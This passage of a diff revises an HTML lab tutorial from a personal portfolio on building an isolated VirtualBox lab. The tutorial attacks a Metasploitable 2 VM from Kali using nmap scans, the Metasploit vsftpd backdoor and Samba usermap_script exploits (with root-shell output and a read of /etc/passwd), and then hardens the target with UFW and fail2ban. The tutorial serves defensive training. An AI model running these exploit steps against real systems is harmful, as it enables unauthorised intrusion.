-      <div class="step"><div class="sn">8</div><div class="sb"><div class="st2">Install in VirtualBox</div><div class="sd"><strong>File → Tools → Extension Pack Manager → Install</strong> (green + icon) → select the .vbox-extpack file → click <strong>I Agree</strong>.</div></div></div>
+      <div class="step"><div class="sn">7</div><div class="sb"><div class="st2">Download the Extension Pack</div><div class="sd">On the same downloads page find "VirtualBox 7.2.6 Oracle VM VirtualBox Extension Pack" → click "All supported platforms". File: <code>Oracle_VirtualBox_Extension_Pack-7.2.6.vbox-extpack</code></div></div></div>
+      <div class="step"><div class="sn">8</div><div class="sb"><div class="st2">Install in VirtualBox</div><div class="sd"><strong>File → Tools → Extension Pack Manager → Install</strong> (green + icon) → select the <code>.vbox-extpack</code> file → click <strong>I Agree</strong>.</div></div></div>
     </div>
     <div class="exp"><div class="exp-lbl">Expected Result</div>Extension Pack version 7.2.6 in the list with a green tick. ✅</div>
   </div>
 
-  <!-- S4 -->
-  <div class="sec"><span class="anc" id="s4"></span>
+  <!-- ═══ SECTION 4 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s4"></span>
     <div class="slabel">04 — Kali Linux</div>
     <h2>Download &amp; Verify Kali Linux ISO</h2>
     <div class="steps">
       <div class="step"><div class="sn">1</div><div class="sb"><div class="st2">Go to the official Kali download page</div><div class="sd"><code>https://www.kali.org/get-kali/#kali-installer-images</code> — select <strong>Installer (64-bit)</strong>. File: <code>kali-linux-2026.1-installer-amd64.iso</code> (~3.8–4.2 GB)</div></div></div>
       <div class="step"><div class="sn">2</div><div class="sb"><div class="st2">Get the expected SHA256 hash</div><div class="sd">On the download page click <strong>"Sum"</strong> next to the installer. Copy the long hash string — you will compare against it.</div></div></div>
-      <div class="step"><div class="sn">3</div><div class="sb"><div class="st2">Verify your download</div><div class="sd">Run the checksum command and confirm it matches exactly:</div></div></div>
+      <div class="step"><div class="sn">3</div><div class="sb"><div class="st2">Verify your download — run the checksum command:</div></div></div>
     </div>
     <p><strong>Windows (PowerShell):</strong></p>
     <pre><code>Get-FileHash C:\Users\YourName\Downloads\kali-linux-2026.1-installer-amd64.iso -Algorithm SHA256</code></pre>
@@ -218,35 +491,43 @@ footer a{color:var(--green);text-decoration:none;}
     <div class="exp"><div class="exp-lbl">Expected Result</div>The hash output matches the website hash character-for-character. If even one character differs, delete the file and re-download.</div>
   </div>
 
-  <!-- S5 -->
-  <div class="sec"><span class="anc" id="s5"></span>
+  <!-- ═══ SECTION 5 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s5"></span>
     <div class="slabel">05 — Network Setup</div>
     <h2>Create the Isolated Virtual Lab Network</h2>
-    <div class="tip"><div class="tip-lbl">Why Isolation Is Critical</div>Attack tools send exploit packets that could harm any vulnerable system on the same network. Without isolation you could accidentally attack your router. This setup creates a private virtual network that exists only inside VirtualBox — invisible to your real home network and the internet.</div>
+    <div class="tip">
+      <div class="tip-lbl">Why Isolation Is Critical</div>
+      Attack tools send exploit packets that could harm any vulnerable system on the same network. Without isolation you could accidentally attack your router. This setup creates a private virtual network that exists only inside VirtualBox — invisible to your real home network and the internet.
+    </div>
     <div class="steps">
       <div class="step"><div class="sn">1</div><div class="sb"><div class="st2">Open Network Manager</div><div class="sd">In VirtualBox Manager: <strong>File → Tools → Network Manager → Host-only Networks tab</strong></div></div></div>
-      <div class="step"><div class="sn">2</div><div class="sb"><div class="st2">Create a new adapter</div><div class="sd">Click the green <strong>Create</strong> (+) button. A network named <code>vboxnet0</code> (macOS/Linux) or <code>VirtualBox Host-Only Ethernet Adapter</code> (Windows) appears.</div></div></div>
+      <div class="step"><div class="sn">2</div><div class="sb"><div class="st2">Create a new adapter</div><div class="sd">Click the green <strong>Create (+)</strong> button. A network named <code>vboxnet0</code> (macOS/Linux) or <code>VirtualBox Host-Only Ethernet Adapter</code> (Windows) appears.</div></div></div>
       <div class="step"><div class="sn">3</div><div class="sb"><div class="st2">Configure the adapter settings</div><div class="sd">Select the new network → <strong>Properties → Adapter tab</strong>:<br>IPv4 Address: <code>192.168.56.1</code><br>IPv4 Network Mask: <code>255.255.255.0</code><br>Enable: <strong>ticked</strong></div></div></div>
-      <div class="step"><div class="sn">4</div><div class="sb"><div class="st2">Disable DHCP Server</div><div class="sd">Click <strong>DHCP Server</strong> tab → ensure "Enable Server" is <strong>unticked</strong> (we assign IPs manually). Click <strong>Apply → OK</strong>.</div></div></div>
+      <div class="step"><div class="sn">4</div><div class="sb"><div class="st2">Disable DHCP Server</div><div class="sd">Click <strong>DHCP Server tab</strong> → ensure "Enable Server" is <strong>unticked</strong> (we assign IPs manually). Click <strong>Apply → OK</strong>.</div></div></div>
     </div>
     <div class="exp"><div class="exp-lbl">Expected Result</div>A Host-Only network <code>vboxnet0</code> exists with subnet <code>192.168.56.0/24</code>. ✅</div>
   </div>
 
-  <!-- S6 -->
-  <div class="sec"><span class="anc" id="s6"></span>
+  <!-- ═══ SECTION 6 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s6"></span>
     <div class="slabel">06 — Kali VM</div>
     <h2>Create and Install the Kali Linux Attacker VM</h2>
+
     <h3>6.1 Create the VM</h3>
     <div class="steps">
       <div class="step"><div class="sn">1</div><div class="sb"><div class="st2">Click New in VirtualBox Manager</div><div class="sd">Name: <code>Kali-Attacker</code> · ISO: select your Kali .iso file · Type: <strong>Linux</strong> · Version: <strong>Debian (64-bit)</strong></div></div></div>
       <div class="step"><div class="sn">2</div><div class="sb"><div class="st2">Set hardware resources</div><div class="sd">RAM: <code>2048 MB</code> minimum / <code>4096 MB</code> recommended · CPU: <code>2</code> processors</div></div></div>
       <div class="step"><div class="sn">3</div><div class="sb"><div class="st2">Create virtual hard disk</div><div class="sd">Select <strong>"Create a Virtual Hard Disk Now"</strong> · Size: <code>30 GB</code> minimum / <code>50 GB</code> recommended · Click <strong>Finish</strong></div></div></div>
     </div>
+
     <h3>6.2 Configure Network Adapters</h3>
     <div class="steps">
       <div class="step"><div class="sn">4</div><div class="sb"><div class="st2">Adapter 1 — Internet access (NAT)</div><div class="sd">Settings → Network → Adapter 1: <strong>Attached to: NAT</strong>. Gives Kali internet access to download tools and updates.</div></div></div>
       <div class="step"><div class="sn">5</div><div class="sb"><div class="st2">Adapter 2 — Lab network (Host-only)</div><div class="sd">Adapter 2 tab: tick <strong>Enable</strong> → Attached to: <strong>Host-only Adapter</strong> → Name: <code>vboxnet0</code>. Click <strong>OK</strong>.</div></div></div>
     </div>
+
     <h3>6.3 Install Kali Linux — Full Steps</h3>
     <div class="steps">
       <div class="step"><div class="sn">6</div><div class="sb"><div class="st2">Start the VM and boot into installer</div><div class="sd">Double-click <code>Kali-Attacker</code>. At the boot menu select <strong>"Graphical Install"</strong> using arrow keys → Enter.</div></div></div>
@@ -256,7 +537,11 @@ footer a{color:var(--green);text-decoration:none;}
       <div class="step"><div class="sn">10</div><div class="sb"><div class="st2">Software selection and GRUB</div><div class="sd">Keep default software selections ticked. When asked for GRUB: <strong>Yes</strong> → select <code>/dev/sda</code> → click <strong>Continue</strong> to reboot.</div></div></div>
     </div>
     <div class="exp"><div class="exp-lbl">Expected Result</div>Kali boots to a graphical login screen with the dragon logo. Log in with your username and password. ✅</div>
-    <div class="warn"><div class="warn-lbl">⚠ Common Error — Black Screen After Reboot</div>In VirtualBox Settings → Display → increase Video Memory to 128 MB. Then restart the VM.</div>
+    <div class="warn">
+      <div class="warn-lbl">⚠ Common Error — Black Screen After Reboot</div>
+      In VirtualBox Settings → Display → increase Video Memory to 128 MB. Then restart the VM.
+    </div>
+
     <h3>6.4 Update Kali Linux</h3>
     <p>Open a terminal (right-click desktop → Open Terminal):</p>
     <pre><code>sudo apt update
@@ -264,8 +549,9 @@ sudo apt upgrade -y</code></pre>
     <div class="exp"><div class="exp-lbl">Expected Result</div>All packages update without errors. Takes 5–15 minutes. ✅</div>
   </div>
 
-  <!-- S7 -->
-  <div class="sec"><span class="anc" id="s7"></span>
+  <!-- ═══ SECTION 7 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s7"></span>
     <div class="slabel">07 — Target VM</div>
     <h2>Create the Vulnerable Target VM (Metasploitable 2)</h2>
     <p>Metasploitable 2 is a purpose-built vulnerable Linux server created by Rapid7. It contains dozens of deliberately insecure services — perfect for practising real attacks legally and safely.</p>
@@ -277,11 +563,15 @@ sudo apt upgrade -y</code></pre>
       <div class="step"><div class="sn">5</div><div class="sb"><div class="st2">Set to Host-only network ONLY</div><div class="sd">Settings → Network → Adapter 1: <strong>Host-only Adapter</strong> → <code>vboxnet0</code>. Ensure Adapters 2, 3, 4 are <strong>disabled</strong>. Click <strong>OK</strong>.</div></div></div>
       <div class="step"><div class="sn">6</div><div class="sb"><div class="st2">Start and find the IP address</div><div class="sd">Start the VM → log in with <code>msfadmin</code> / <code>msfadmin</code> → run <code>ifconfig</code> → note the IP (e.g. <code>192.168.56.101</code>). This is your attack target.</div></div></div>
     </div>
-    <div class="warn"><div class="warn-lbl">⚠ Critical Security Note</div>Metasploitable must have <strong>NO internet connection</strong>. Host-only networking ensures it can only communicate with Kali inside the lab. This is mandatory — Metasploitable with internet access will be compromised by real attackers within minutes.</div>
+    <div class="warn">
+      <div class="warn-lbl">⚠ Critical Security Note</div>
+      Metasploitable must have <strong>NO internet connection</strong>. Host-only networking ensures it can only communicate with Kali inside the lab. This is mandatory — Metasploitable with internet access will be compromised by real attackers within minutes.
+    </div>
   </div>
 
-  <!-- S8 -->
-  <div class="sec"><span class="anc" id="s8"></span>
+  <!-- ═══ SECTION 8 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s8"></span>
     <div class="slabel">08 — Connectivity</div>
     <h2>Configure the Virtual Network &amp; Test Connectivity</h2>
     <p>In your Kali terminal, find the lab IP: <code>ip addr show</code> — look for <code>eth1</code> showing a <code>192.168.56.x</code> address.</p>
@@ -297,11 +587,12 @@ sudo apt upgrade -y</code></pre>
     <div class="ssnote">📸 Screenshot both VMs running in VirtualBox Manager — first portfolio screenshot.</div>
   </div>
 
-  <!-- S9 -->
-  <div class="sec"><span class="anc" id="s9"></span>
+  <!-- ═══ SECTION 9 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s9"></span>
     <div class="slabel">09 — Defending First</div>
     <h2>Basic Hardening on the Target VM (Defending Side)</h2>
-    <p>Log into Metasploitable with <code>msfadmin</code> / <code>msfadmin</code>. You will apply defences <em>before</em> attacking — this teaches you both sides of the battle.</p>
+    <p>Log into Metasploitable with <code>msfadmin</code> / <code>msfadmin</code>. You will apply defences <strong>before</strong> attacking — this teaches you both sides of the battle.</p>
     <h3>Enable UFW Firewall</h3>
     <pre><code><span class="cm"># Install UFW</span>
 sudo apt-get install ufw -y
@@ -318,15 +609,22 @@ sudo ufw enable
 
 <span class="cm"># Verify status</span>
 sudo ufw status verbose</code></pre>
-    <div class="exp"><div class="exp-lbl">Expected Result</div><code>Status: active<br>Default: deny (incoming), allow (outgoing)<br>22/tcp    ALLOW IN    Anywhere</code></div>
+    <div class="exp">
+      <div class="exp-lbl">Expected Result</div>
+      <code>Status: active<br>Default: deny (incoming), allow (outgoing)<br>22/tcp    ALLOW IN    Anywhere</code>
+    </div>
     <h3>Enable System Logging</h3>
     <pre><code>sudo service rsyslog start
 sudo tail -f /var/log/auth.log &</code></pre>
-    <div class="tip"><div class="tip-lbl">Take a Snapshot</div>Name it <code>Hardened Baseline — Firewall On</code> before proceeding to attacks.</div>
+    <div class="tip">
+      <div class="tip-lbl">Take a Snapshot</div>
+      Name it <code>Hardened Baseline — Firewall On</code> before proceeding to attacks.
+    </div>
   </div>
 
-  <!-- S10 -->
-  <div class="sec"><span class="anc" id="s10"></span>
+  <!-- ═══ SECTION 10 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s10"></span>
     <div class="slabel">10 — Attacking</div>
     <h2>Attacking Methods — Step-by-Step Practice</h2>
     <p>All commands run from your <strong>Kali Linux VM</strong>. Replace <code>192.168.56.101</code> with your Metasploitable IP throughout.</p>
@@ -340,7 +638,10 @@ sudo tail -f /var/log/auth.log &</code></pre>
     <h4>Aggressive service version scan</h4>
     <pre><code><span class="cm"># Detect versions, run scripts, detect OS, save to file</span>
 nmap -sV -sC -O 192.168.56.101 -oN scan_results.txt</code></pre>
-    <div class="exp"><div class="exp-lbl">Expected Output (excerpt) — exact software versions that map to CVEs</div><code>21/tcp   open  ftp     vsftpd 2.3.4<br>22/tcp   open  ssh     OpenSSH 4.7p1<br>80/tcp   open  http    Apache httpd 2.2.8<br>139/tcp  open  netbios-ssn  Samba 3.x-4.x<br>3306/tcp open  mysql   MySQL 5.0.51a</code></div>
+    <div class="exp">
+      <div class="exp-lbl">Expected Output (excerpt) — exact software versions that map to CVEs</div>
+      <code>21/tcp   open  ftp     vsftpd 2.3.4<br>22/tcp   open  ssh     OpenSSH 4.7p1<br>80/tcp   open  http    Apache httpd 2.2.8<br>139/tcp  open  netbios-ssn  Samba 3.x-4.x<br>3306/tcp open  mysql   MySQL 5.0.51a</code>
+    </div>
     <div class="ssnote">📸 Screenshot the version numbers — these are your exploitation targets.</div>
 
     <h4>Vulnerability script scan</h4>
@@ -359,35 +660,39 @@ nmap -sV -sC -O 192.168.56.101 -oN scan_results.txt</code></pre>
 msfconsole
 
 <span class="cm"># Search for the exploit module</span>
-msf6 > search vsftpd
+msf6 &gt; search vsftpd
 
 <span class="cm"># Load the exploit</span>
-msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 &gt; use exploit/unix/ftp/vsftpd_234_backdoor
 
 <span class="cm"># Set the target IP</span>
-msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.56.101
+msf6 exploit(vsftpd_234_backdoor) &gt; set RHOSTS 192.168.56.101
 
 <span class="cm"># Run it</span>
-msf6 exploit(vsftpd_234_backdoor) > run</code></pre>
-    <div class="exp"><div class="exp-lbl">Expected Output — Root shell achieved ✅</div><code>[+] 192.168.56.101:21 - UID: uid=0(root) gid=0(root)<br>[*] Command shell session 1 opened<br><br>id<br>uid=0(root) gid=0(root) groups=0(root)</code></div>
+msf6 exploit(vsftpd_234_backdoor) &gt; run</code></pre>
+    <div class="exp">
+      <div class="exp-lbl">Expected Output — Root shell achieved ✅</div>
+      <code>[+] 192.168.56.101:21 - UID: uid=0(root) gid=0(root)<br>[*] Command shell session 1 opened<br><br>id<br>uid=0(root) gid=0(root) groups=0(root)</code>
+    </div>
     <div class="ssnote">📸 Screenshot the root shell immediately — most important evidence screenshot of the project.</div>
     <p>Confirm root access and document:</p>
     <pre><code>id
 whoami
 cat /etc/passwd
-ls /home</code></pre>
-    <pre><code>exit</code></pre>
+ls /home
+
+exit</code></pre>
 
     <h3>Attack 4: Metasploit — Samba usermap_script (CVE-2007-2447)</h3>
-    <pre><code>msf6 > use exploit/multi/samba/usermap_script
-msf6 exploit(usermap_script) > set RHOSTS 192.168.56.101
-msf6 exploit(usermap_script) > set LHOST 192.168.56.102
-msf6 exploit(usermap_script) > run</code></pre>
+    <pre><code>msf6 &gt; use exploit/multi/samba/usermap_script
+msf6 exploit(usermap_script) &gt; set RHOSTS 192.168.56.101
+msf6 exploit(usermap_script) &gt; set LHOST 192.168.56.102
+msf6 exploit(usermap_script) &gt; run</code></pre>
     <div class="exp"><div class="exp-lbl">Expected Output — Second root shell: [*] Command shell session 2 opened</div></div>
 
     <h3>Attack 5: Packet Capture with Wireshark</h3>
     <pre><code><span class="cm"># Launch Wireshark</span>
-wireshark &
+wireshark &amp;
 
 <span class="cm"># Select eth1 interface → start capture
 # Apply display filter:</span>
@@ -397,8 +702,9 @@ ip.addr == 192.168.56.101</code></pre>
     <div class="ssnote">📸 Screenshot Wireshark with filter applied showing port scan traffic.</div>
   </div>
 
-  <!-- S11 -->
-  <div class="sec"><span class="anc" id="s11"></span>
+  <!-- ═══ SECTION 11 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s11"></span>
     <div class="slabel">11 — Defending</div>
     <h2>Defending Methods — Step-by-Step Practice</h2>
     <p>Switch to <strong>Metasploitable</strong> for all steps in this section.</p>
@@ -438,7 +744,10 @@ ssh msfadmin@192.168.56.101
 ssh msfadmin@192.168.56.101</code></pre>
     <p>Check the ban on Metasploitable:</p>
     <pre><code>sudo fail2ban-client status sshd</code></pre>
-    <div class="exp"><div class="exp-lbl">Expected Result — Kali's IP is automatically banned</div><code>|- Currently banned: 1<br>`- Banned IP list: 192.168.56.102</code></div>
+    <div class="exp">
+      <div class="exp-lbl">Expected Result — Kali's IP is automatically banned</div>
+      <code>|- Currently banned: 1<br>`- Banned IP list: 192.168.56.102</code>
+    </div>
     <div class="ssnote">📸 Screenshot fail2ban showing the banned IP — automated intrusion prevention in action.</div>
 
     <h3>Monitor Attack Logs in Real Time</h3>
@@ -448,8 +757,9 @@ ssh msfadmin@192.168.56.101</code></pre>
     <div class="ssnote">📸 Screenshot the live log entry — this is what SOC analysts look for in real incidents.</div>
   </div>
 
-  <!-- S12 -->
-  <div class="sec"><span class="anc" id="s12"></span>
+  <!-- ═══ SECTION 12 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s12"></span>
     <div class="slabel">12 — Full Simulation</div>
     <h2>Full Attack + Defence Simulation Exercise</h2>
     <p><strong>Scenario: "Operation Cyber Shield"</strong> — a complete end-to-end exercise.</p>
@@ -476,22 +786,31 @@ exit</code></pre>
 use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS 192.168.56.101
 run</code></pre>
-    <div class="exp"><div class="exp-lbl">Expected Result — The same exploit that worked before now FAILS ✅</div><code>[-] 192.168.56.101:21 - The connection was refused by the remote host<br>[*] Exploit completed, but no session was created.</code></div>
+    <div class="exp">
+      <div class="exp-lbl">Expected Result — The same exploit that worked before now FAILS ✅</div>
+      <code>[-] 192.168.56.101:21 - The connection was refused by the remote host<br>[*] Exploit completed, but no session was created.</code>
+    </div>
     <div class="ssnote">📸 Screenshot this — the most powerful evidence for your portfolio.</div>
 
     <h3>Phase 3 — Before/After Comparison</h3>
-    <div class="tw"><table><thead><tr><th>Attack</th><th>Before Hardening</th><th>After Hardening</th></tr></thead><tbody>
-      <tr><td>Nmap port scan</td><td>23+ ports visible</td><td>Most ports filtered ✅</td></tr>
-      <tr><td>vsftpd exploit</td><td>Root shell obtained ❌</td><td>Connection refused ✅</td></tr>
-      <tr><td>Samba exploit</td><td>Root shell obtained ❌</td><td>Connection refused ✅</td></tr>
-      <tr><td>SSH brute force</td><td>Login attempted ❌</td><td>IP banned after 3 tries ✅</td></tr>
-      <tr><td>Ping / ICMP</td><td>Responded ❌</td><td>No response (dropped) ✅</td></tr>
-    </tbody></table></div>
+    <div class="tw">
+      <table>
+        <thead><tr><th>Attack</th><th>Before Hardening</th><th>After Hardening</th></tr></thead>
+        <tbody>
+          <tr><td>Nmap port scan</td><td>23+ ports visible</td><td>Most ports filtered ✅</td></tr>
+          <tr><td>vsftpd exploit</td><td>Root shell obtained ❌</td><td>Connection refused ✅</td></tr>
+          <tr><td>Samba exploit</td><td>Root shell obtained ❌</td><td>Connection refused ✅</td></tr>
+          <tr><td>SSH brute force</td><td>Login attempted ❌</td><td>IP banned after 3 tries ✅</td></tr>
+          <tr><td>Ping / ICMP</td><td>Responded ❌</td><td>No response (dropped) ✅</td></tr>
+        </tbody>
+      </table>
+    </div>
     <div class="ssnote">📸 Screenshot this completed table for your portfolio documentation.</div>
   </div>
 
-  <!-- S13 -->
-  <div class="sec"><span class="anc" id="s13"></span>
+  <!-- ═══ SECTION 13 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s13"></span>
     <div class="slabel">13 — Documentation</div>
     <h2>Documentation Requirements</h2>
     <ul class="cl">
@@ -521,21 +840,39 @@ run</code></pre>
 └── Project-Report.md  ← Written summary</code></pre>
   </div>
 
-  <!-- S14 -->
-  <div class="sec"><span class="anc" id="s14"></span>
+  <!-- ═══ SECTION 14 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s14"></span>
     <div class="slabel">14 — Safety</div>
     <h2>Safety Rules &amp; Best Practices</h2>
-    <div class="warn"><div class="warn-lbl">⚠ Rule 1 — Always Snapshot Before Attacking</div>Before running any exploit, take a snapshot of both VMs. Restore instantly if something breaks.</div>
-    <div class="warn"><div class="warn-lbl">⚠ Rule 2 — Never Give Metasploitable Internet Access</div>This machine is riddled with vulnerabilities by design. With internet access it will be compromised by real attackers within minutes. Check networking every session.</div>
-    <div class="warn"><div class="warn-lbl">⚠ Rule 3 — Only Attack Machines You Own</div>Running Nmap, Metasploit, or any offensive tool against any network you do not own is illegal in most countries. This lab exists only on your laptop. Never run these tools externally.</div>
-    <div class="tip"><div class="tip-lbl">Rule 4 — Power Off VMs When Finished</div>Shut down both VMs after each session. They consume RAM and could cause issues if left running.</div>
-    <div class="tip"><div class="tip-lbl">Rule 5 — Keep VirtualBox Updated</div>Check for VirtualBox updates monthly to protect against hypervisor vulnerabilities.</div>
+    <div class="warn">
+      <div class="warn-lbl">⚠ Rule 1 — Always Snapshot Before Attacking</div>
+      Before running any exploit, take a snapshot of both VMs. Restore instantly if something breaks.
+    </div>
+    <div class="warn">
+      <div class="warn-lbl">⚠ Rule 2 — Never Give Metasploitable Internet Access</div>
+      This machine is riddled with vulnerabilities by design. With internet access it will be compromised by real attackers within minutes. Check networking every session.
+    </div>
+    <div class="warn">
+      <div class="warn-lbl">⚠ Rule 3 — Only Attack Machines You Own</div>
+      Running Nmap, Metasploit, or any offensive tool against any network you do not own is illegal in most countries. This lab exists only on your laptop. Never run these tools externally.
+    </div>
+    <div class="tip">
+      <div class="tip-lbl">Rule 4 — Power Off VMs When Finished</div>
+      Shut down both VMs after each session. They consume RAM and could cause issues if left running.
+    </div>
+    <div class="tip">
+      <div class="tip-lbl">Rule 5 — Keep VirtualBox Updated</div>
+      Check for VirtualBox updates monthly to protect against hypervisor vulnerabilities.
+    </div>
   </div>
 
-  <!-- S15 -->
-  <div class="sec"><span class="anc" id="s15"></span>
+  <!-- ═══ SECTION 15 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s15"></span>
     <div class="slabel">15 — Completion</div>
     <h2>Project Completion Checklist &amp; Portfolio Summary</h2>
+
     <h3>Completion Checklist</h3>
     <ul class="cl">
       <li>VirtualBox 7.2.6 installed with Extension Pack active</li>
@@ -556,7 +893,7 @@ run</code></pre>
     </ul>
 
     <div class="pbox">
-      <h3>Portfolio Summary — Copy for Resume, LinkedIn, or Cover Letter</h3>
+      <div class="pbox-title">Portfolio Summary — Copy for Resume, LinkedIn, or Cover Letter</div>
 
       <div class="pver">
         <button class="cbtn" onclick="copyText('short')">Copy</button>
@@ -571,7 +908,7 @@ run</code></pre>
 
 Built a completely isolated virtual lab environment using Oracle VirtualBox 7.2.6 and Kali Linux 2026.1. The lab consisted of a Kali Linux attacker machine and a deliberately vulnerable Metasploitable 2 target server connected via a private host-only network with zero internet exposure.
 
-Offensive activities: Network reconnaissance with Nmap (host discovery, service version detection, OS fingerprinting, vulnerability scripts). Web application scanning with Nikto. Successful exploitation of CVE-2011-2523 (vsftpd backdoor) and CVE-2007-2447 (Samba usermap_script) using Metasploit Framework — achieving root-level access on both. Packet capture and traffic analysis with Wireshark.
+Offensive activities: Network reconnaissance with Nmap. Web application scanning with Nikto. Successful exploitation of CVE-2011-2523 (vsftpd backdoor) and CVE-2007-2447 (Samba usermap_script) using Metasploit Framework — achieving root-level access on both. Packet capture and traffic analysis with Wireshark.
 
 Defensive hardening: UFW default-deny firewall policy. IPTables SYN rate-limiting to defeat port scanning. fail2ban automated IP banning after brute-force attempts. Real-time attack detection via /var/log/auth.log monitoring.
 
@@ -580,11 +917,12 @@ Outcome: All previously successful exploits were completely blocked after harden
 Tools: VirtualBox · Kali Linux · Metasploit · Nmap · Nikto · Wireshark · UFW · iptables · fail2ban</p>
       </div>
 
-      <div style="margin-top:14px;padding:16px 18px;background:var(--bg3);border:1px solid var(--border);border-radius:4px;">
+      <div style="margin-top:14px;padding:16px 18px;background:var(--bg2);border:1px solid var(--border);border-radius:4px;">
         <div class="pvlbl">Skills Demonstrated</div>
         <div class="tagrow">
-          <span class="stag">VirtualBox</span><span class="stag">Kali Linux</span><span class="stag">Nmap</span>
-          <span class="stag">Metasploit</span><span class="stag">Nikto</span><span class="stag">Wireshark</span>
+          <span class="stag">VirtualBox</span><span class="stag">Kali Linux</span>
+          <span class="stag">Nmap</span><span class="stag">Metasploit</span>
+          <span class="stag">Nikto</span><span class="stag">Wireshark</span>
           <span class="stag">UFW / iptables</span><span class="stag">fail2ban</span>
           <span class="stag">CVE-2011-2523</span><span class="stag">CVE-2007-2447</span>
           <span class="stag">Penetration Testing</span><span class="stag">Incident Response</span>
@@ -593,11 +931,70 @@ Tools: VirtualBox · Kali Linux · Metasploit · Nmap · Nikto · Wireshark · U
       </div>
     </div>
   </div>
-</div>
-<footer><a href="index.html">← Gaurav Shirke Portfolio</a> &nbsp;·&nbsp; Senior Cyber Security Engineer &nbsp;·&nbsp; Mumbai, India</footer>
+
+</div><!-- .container -->
+
+<footer>
+  <a href="index.html">← Gaurav Shirke Portfolio</a> &nbsp;·&nbsp; <span>Senior Cyber Security Engineer</span> &nbsp;·&nbsp; Mumbai, India
+</footer>
+
+<!-- ═══════════════════════════════════════════
+     JAVASCRIPT — EXACT COPY FROM index.html
+     ═══════════════════════════════════════════ -->
 <script>
-window.addEventListener('scroll',()=>{const d=document.documentElement;const s=(d.scrollTop||document.body.scrollTop)/(d.scrollHeight-d.clientHeight);document.getElementById('prog').style.width=(s*100)+'%';},{passive:true});
-function copyText(id){const el=document.getElementById(id);navigator.clipboard.writeText(el.innerText).then(()=>{const btn=el.parentElement.querySelector('.cbtn');btn.textContent='Copied!';setTimeout(()=>btn.textContent='Copy',2000);});}
+// CURSOR — character-for-character from index.html
+const cur = document.getElementById('cur');
+const curR = document.getElementById('cur-ring');
+let mx=0,my=0,rx=0,ry=0;
+document.addEventListener('mousemove',e=>{mx=e.clientX;my=e.clientY;});
+(function ac(){rx+=(mx-rx)*.18;ry+=(my-ry)*.18;cur.style.left=mx+'px';cur.style.top=my+'px';curR.style.left=rx+'px';curR.style.top=ry+'px';requestAnimationFrame(ac);})();
+document.querySelectorAll('a,button,.stag,.stat,.step,.tc').forEach(el=>{
+  el.addEventListener('mouseenter',()=>{cur.style.width='20px';cur.style.height='20px';cur.style.background='#00d4ff';curR.style.width='52px';curR.style.height='52px';});
+  el.addEventListener('mouseleave',()=>{cur.style.width='12px';cur.style.height='12px';cur.style.background='#00e5a0';curR.style.width='36px';curR.style.height='36px';});
+});
+
+// MATRIX RAIN — exact from index.html
+(function(){
+  const cv=document.getElementById('matrix-canvas'),ctx=cv.getContext('2d');
+  let W,H,cols,drops;
+  const ch='01アイウエオカキクケコサシスセソタチツテトナニヌネノ'.split('');
+  function init(){W=cv.width=window.innerWidth;H=cv.height=window.innerHeight;cols=Math.floor(W/18);drops=Array(cols).fill(0).map(()=>Math.random()*-80);}
+  function draw(){ctx.fillStyle='rgba(2,6,8,0.05)';ctx.fillRect(0,0,W,H);for(let i=0;i<cols;i++){const c=ch[Math.floor(Math.random()*ch.length)];ctx.fillStyle=Math.random()>.96?'#ffffff':'#00e5a0';ctx.globalAlpha=Math.random()*.5+.3;ctx.font='13px monospace';ctx.fillText(c,i*18,drops[i]*18);if(drops[i]*18>H&&Math.random()>.975)drops[i]=0;drops[i]+=.4;}ctx.globalAlpha=1;}
+  init();setInterval(draw,55);window.addEventListener('resize',init);
+})();
+
+// PARTICLES — exact from index.html
+(function(){
+  const cv=document.getElementById('particle-canvas'),ctx=cv.getContext('2d');
+  let W,H;const pts=[];
+  function P(){this.reset=function(){this.x=Math.random()*W;this.y=Math.random()*H;this.r=Math.random()*1.4+.3;this.vx=(Math.random()-.5)*.3;this.vy=(Math.random()-.5)*.3;this.a=Math.random()*.35+.1;this.life=Math.random()*300+200;this.age=0;};this.reset();}
+  P.prototype.upd=function(){this.x+=this.vx;this.y+=this.vy;this.age++;if(this.age>this.life||this.x<0||this.x>W||this.y<0||this.y>H)this.reset();};
+  P.prototype.drw=function(){ctx.beginPath();ctx.arc(this.x,this.y,this.r,0,Math.PI*2);ctx.fillStyle='rgba(0,229,160,'+this.a+')';ctx.fill();};
+  function init(){W=cv.width=window.innerWidth;H=cv.height=window.innerHeight;if(!pts.length)for(let i=0;i<100;i++)pts.push(new P());}
+  function draw(){ctx.clearRect(0,0,W,H);for(let i=0;i<pts.length;i++)for(let j=i+1;j<pts.length;j++){const dx=pts[i].x-pts[j].x,dy=pts[i].y-pts[j].y,d=Math.sqrt(dx*dx+dy*dy);if(d<110){ctx.beginPath();ctx.moveTo(pts[i].x,pts[i].y);ctx.lineTo(pts[j].x,pts[j].y);ctx.strokeStyle='rgba(0,229,160,'+(0.07*(1-d/110))+')';ctx.lineWidth=.5;ctx.stroke();}}pts.forEach(p=>{p.upd();p.drw();});requestAnimationFrame(draw);}
+  init();draw();window.addEventListener('resize',init);
+})();
+
+// READING PROGRESS BAR
+window.addEventListener('scroll',()=>{
+  const d=document.documentElement;
+  const s=(d.scrollTop||document.body.scrollTop)/(d.scrollHeight-d.clientHeight);
+  document.getElementById('prog').style.width=(s*100)+'%';
+},{passive:true});
+
+// SCROLL REVEAL — exact from index.html
+const obs=new IntersectionObserver(entries=>{entries.forEach((e,i)=>{if(e.isIntersecting)setTimeout(()=>e.target.classList.add('visible'),i*65);});},{threshold:.08});
+document.querySelectorAll('.reveal').forEach(el=>obs.observe(el));
+
+// COPY BUTTONS
+function copyText(id){
+  const el=document.getElementById(id);
+  navigator.clipboard.writeText(el.innerText).then(()=>{
+    const btn=el.parentElement.querySelector('.cbtn');
+    btn.textContent='Copied!';
